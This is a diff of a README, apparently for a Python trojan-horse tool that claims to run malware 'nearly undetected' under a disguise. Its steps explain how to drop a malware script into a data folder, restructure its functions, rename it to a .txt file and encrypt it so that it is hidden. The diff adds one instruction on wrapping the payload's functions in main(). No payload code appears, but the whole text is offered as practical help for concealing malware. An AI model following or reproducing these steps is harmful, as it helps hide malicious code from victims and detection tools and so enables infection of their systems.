@@ -11,7 +11,7 @@ A Python script designed to run malware nearly undetected (trojan hourse), disgu
 # Steps
 1. Download this repository
 2. Download the block encryption repository
-3. Write/place malware script into 'Data' folder, named as CharacterSet.py
+3. Write/place malware script into 'Data' folder, named as CharacterSet.py. Any functions within your script must be placed inside in "def main():" with no call to main().
 4. Copy ANY used imports from your script into the top of HelperModule.py. Failure to do this may generate "Failure to import" errors at runtime.
 5. Rename CharacterSet.py to CharacterSet.txt
 6. Use block encryption to generate a private key
